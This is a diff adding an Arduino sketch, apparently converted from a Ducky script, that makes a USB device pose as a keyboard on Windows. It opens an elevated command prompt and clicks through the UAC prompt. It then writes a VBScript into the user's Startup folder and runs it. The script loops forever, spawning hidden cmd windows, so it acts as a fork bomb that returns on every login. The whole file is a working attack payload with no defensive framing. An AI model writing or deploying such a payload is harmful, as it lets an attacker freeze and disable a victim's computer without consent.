@@ -1,0 +1,73 @@
+/**
+ * Made with Duckuino, an open-source project.
+ * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
+ */
+
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(1000);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+
+  delay(500);
+  Keyboard.print(F("cmd"));
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  delay(400);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+
+  delay(500);
+  Keyboard.print(F("copy con \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\FB.vbs\""));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("do"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("CreateObject(\"Wscript.Shell\").Run \"cmd\", 0, False"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("loop"));
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+
+  typeKey(KEY_RETURN);
+
+  delay(50);
+  Keyboard.print(F("start FB.vbs && exit"));
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
